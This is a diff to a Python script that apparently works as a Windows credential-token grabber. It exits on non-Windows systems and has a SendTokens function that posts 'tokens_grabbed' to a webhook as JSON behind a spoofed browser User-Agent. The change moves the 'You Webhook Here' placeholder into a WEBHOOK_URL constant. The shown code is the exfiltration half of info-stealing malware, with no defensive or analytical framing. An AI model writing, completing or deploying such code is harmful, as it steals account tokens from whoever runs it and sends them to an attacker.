@@ -1,3 +1,5 @@
+WEBHOOK_URL = 'You Webhook Here'
+
 import os
 if os.name != "nt": exit()
 import json
@@ -44,4 +46,4 @@ def SendTokens(webhook_url, tokens_grabbed = None):
     urlopen(Request(webhook_url, data=json.dumps({"embeds" : embed}).encode(), headers={'Content-Type': 'application/json','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}))
 
 
-SendTokens('You Webhook Here')
+SendTokens(WEBHOOK_URL)
